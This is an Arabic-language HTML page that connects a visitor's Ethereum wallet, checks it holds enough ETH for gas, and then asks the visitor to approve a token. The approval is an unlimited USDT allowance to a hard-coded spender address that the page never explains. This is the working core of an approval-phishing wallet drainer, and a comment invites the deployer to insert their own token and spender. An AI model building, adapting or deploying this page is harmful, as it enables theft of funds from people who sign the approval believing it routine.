<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>ربط المحفظة والموافقة مع فحص الرصيد</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      direction: rtl;
      text-align: center;
      padding: 50px;
      background: #f0f0f0;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      margin: 10px;
      cursor: pointer;
      border-radius: 10px;
      border: none;
      background-color: #ff9900;
      color: white;
    }
    button:hover {
      background-color: #e68a00;
    }
    #status {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>

<h1>ربط المحفظة والموافقة على التوكن</h1>
<button id="connectBtn">ربط المحفظة</button>
<button id="approveBtn" style="display:none;">اعتماد التوكن</button>
<p id="status">يرجى ربط المحفظة أولاً</p>

<script>
  const connectBtn = document.getElementById('connectBtn');
  const approveBtn = document.getElementById('approveBtn');
  const status = document.getElementById('status');

  // غير هنا حسب التوكن والسبندر اللي تريد الموافقة لهم
  const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // مثال USDT
  const spenderAddress = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D'; // مثال سبندر
  const minEthBalance = ethers.utils.parseEther('0.01'); // الحد الأدنى لرصيد ETH

  let provider, signer;

  async function checkBalance(address) {
    const balance = await provider.getBalance(address);
    return balance;
  }

  async function connectWallet() {
    if (typeof window.ethereum === 'undefined') {
      status.textContent = 'يرجى تثبيت MetaMask أو محفظة تدعم Ethereum.';
      return;
    }

    try {
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      status.textContent = `تم الربط: ${userAddress}`;

      const balance = await checkBalance(userAddress);
      if (balance.lt(minEthBalance)) {
        status.textContent += `\nرصيد ETH قليل (${ethers.utils.formatEther(balance)} ETH). لا يمكن تنفيذ الموافقة بدون رصيد كافٍ.`;
        approveBtn.style.display = 'none';
        return;
      }

      approveBtn.style.display = 'inline-block';
      status.textContent += '\nالرصيد كافي، يمكنك الضغط على "اعتماد التوكن".';

    } catch (error) {
      console.error(error);
      status.textContent = 'فشل في ربط المحفظة.';
    }
  }

  async function approveToken() {
    try {
      const abi = [
        "function approve(address spender, uint256 amount) public returns (bool)"
      ];
      const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
      const maxAmount = ethers.constants.MaxUint256;

      status.textContent = 'جاري تنفيذ الموافقة...';

      const tx = await tokenContract.approve(spenderAddress, maxAmount);
      await tx.wait();

      status.textContent = 'تمت الموافقة بنجاح ✅';

    } catch (error) {
      console.error(error);
      status.textContent = 'فشل تنفيذ الموافقة ❌';
    }
  }

  connectBtn.addEventListener('click', connectWallet);
  approveBtn.addEventListener('click', approveToken);

</script>

</body>
</html>
